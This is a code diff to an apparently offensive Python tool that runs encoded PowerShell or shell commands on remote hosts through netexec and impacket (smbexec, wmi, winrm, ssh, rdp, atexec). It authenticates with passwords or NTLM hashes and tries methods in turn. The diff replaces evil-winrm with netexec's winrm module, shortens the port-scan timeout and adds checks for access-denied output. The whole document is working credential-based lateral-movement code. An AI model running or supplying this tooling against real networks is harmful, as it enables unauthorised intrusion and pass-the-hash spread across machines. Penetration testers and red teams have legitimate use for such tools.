@@ -22,11 +22,10 @@ TOOLS_SPECIFIED = False
 LINUX_MODE = False
 
 VALID_TOOLS = ["winrm", "smbexec", "wmi", "ssh", "mssql", "psexec", "atexec", "rdp"]
-NXC_TOOLS = {"smbexec", "ssh", "wmi", "rdp"}
+NXC_TOOLS = {"smbexec", "ssh", "wmi", "rdp", "winrm", "winrm-ssl"}
 
 IMPACKET_PREFIX = "impacket-"  # or "" for .py suffix
 NXC_CMD = "nxc"
-WINRM_CMD = "evil-winrm"
 
 print_lock = threading.Lock()
 
@@ -141,7 +140,7 @@ def parse_tools_list(tools_str):
             tools.append(normalized)
     return tools
 
-def check_port(ip, port, timeout=1):
+def check_port(ip, port, timeout=0.05):
     """Check if a port is open on the given IP."""
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -211,18 +210,6 @@ def build_cmd(tool, user, target, credential, command, use_hash=False):
                 if use_hash else
                 f"{cmd} \"{user}\":{credential}@{target} 'powershell -enc {b64}'")
 
-    # winrm handling - both regular and SSL variants
-    # yes I know nxc has a winrm module which can oneshot commands, but evil-winrm has proved itself more dependable
-    if tool == "winrm":
-        return (f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u \"{user}\" -H {hash_val}"
-                if use_hash else
-                f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u \"{user}\" -p {credential}")
-    
-    if tool == "winrm-ssl":
-        return (f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u \"{user}\" -H {hash_val} --ssl"
-                if use_hash else
-                f"echo 'powershell -enc {b64}' | {WINRM_CMD} -i {target} -u \"{user}\" -p {credential} --ssl")
-
     # NXC tools
     if tool == "smbexec":
         return (f"{NXC_CMD} smb {target} -H {hash_val} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}"
@@ -239,9 +226,19 @@ def build_cmd(tool, user, target, credential, command, use_hash=False):
     if tool == "ssh":
         if LINUX_MODE:
             b64 = base64.b64encode(command.encode("utf-8")).decode()
-            return f"{NXC_CMD} ssh {target} -p {credential} -u \"{user}\" -x 'echo {b64} | base64 -d | $0'{nxc_output_flag}"
+            return f"{NXC_CMD} ssh {target} -p {credential} -u \"{user}\" -x 'echo {b64} | base64 -d | $SHELL'{nxc_output_flag}"
         return f"{NXC_CMD} ssh {target} -p {credential} -u \"{user}\" -x 'powershell -enc {b64}'{nxc_output_flag}"
 
+    if tool == "winrm":
+        return (f"{NXC_CMD} winrm {target} -u \"{user}\" -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
+                if use_hash else
+                f"{NXC_CMD} winrm {target} -u \"{user}\" -p {credential} -X 'powershell -enc {b64}'{nxc_output_flag}")
+    
+    if tool == "winrm-ssl":
+        return (f"{NXC_CMD} winrm {target} -u \"{user}\" -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
+                if use_hash else
+                f"{NXC_CMD} winrm {target} -u \"{user}\" -p {credential} -X 'powershell -enc {b64}'{nxc_output_flag}")
+    
     if tool == "rdp":
         return (f"{NXC_CMD} rdp {target} -u \"{user}\" -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
                 if use_hash else
@@ -324,6 +321,7 @@ def run_chain(user, ip, credential, command, use_hash=False, tool_list=None):
                 safe_print(f"  [-] For {ip}: {tool} failed.")
                 continue
 
+        print("tool:", tool)
         if tool in NXC_TOOLS or tool == "atexec":
             if '[-]' in out:
                 if "Could not retrieve" in out:
@@ -339,6 +337,9 @@ def run_chain(user, ip, credential, command, use_hash=False, tool_list=None):
             if '[+]' in out and '[+] Executed' not in out:
                 safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but seemingly failed to run command. Does the user have the necessary permissions?")
                 continue
+            if '[+]' in out and 'Access is denied.' in out:
+                safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but permission was denied. Does the user have the necessary permissions?")
+                continue
             if rc == 0 and out == "":
                 # nxc tools will sometimes just fail silently
                 safe_print(f"  [-] For {ip}: {tool} failed.")
@@ -352,8 +353,7 @@ def run_chain(user, ip, credential, command, use_hash=False, tool_list=None):
                 safe_print(f"  [-] For {ip}: {tool} failed.")
                 continue
 
-        # one-shotting using evil-winrm results in a return code of 1
-        if rc == 0 or (tool in ("winrm", "winrm-ssl") and rc == 1 and "NoMethodError" in out): 
+        if rc == 0: 
             if RUN_ALL:
                 # need to run all tools, even if we succeeded
                 safe_print(f"  [+] Success! With command: {cmd}")
@@ -446,7 +446,7 @@ def parse_args():
 
 def check_dependencies():
     """Check if required tools are installed."""
-    global IMPACKET_PREFIX, NXC_CMD, WINRM_CMD
+    global IMPACKET_PREFIX, NXC_CMD
 
     missing_tools = []
 
@@ -473,25 +473,12 @@ def check_dependencies():
     else:
         missing_tools.append("nxc")
 
-    # Check evil-winrm
-    if shutil.which("evil-winrm"):
-        WINRM_CMD = "evil-winrm"
-    elif os.path.isdir("/usr/local/rvm/gems"):
-        # default in exegol
-        for d in os.listdir("/usr/local/rvm/gems"):
-            if d.endswith("@evil-winrm"):
-                WINRM_CMD = f"/usr/local/rvm/gems/{d}/wrappers/evil-winrm"
-    else:
-        missing_tools.append("evil-winrm")
-
     if not missing_tools == []:
         for tool in missing_tools:
             if tool == "nxc":
                 print("[-] netexec not found. Install with: pipx install git+https://github.com/Pennyw0rth/NetExec")
             if tool == "impacket" and not LINUX_MODE:
                 print("[-] impacket not found. Install with: pipx install impacket")
-            if tool == "evil-winrm" and not LINUX_MODE:
-                print("[-] evil-winrm not found. Please install with gem install evil-winrm")    
         sys.exit(1)
     
 def impacket_cmd(tool):
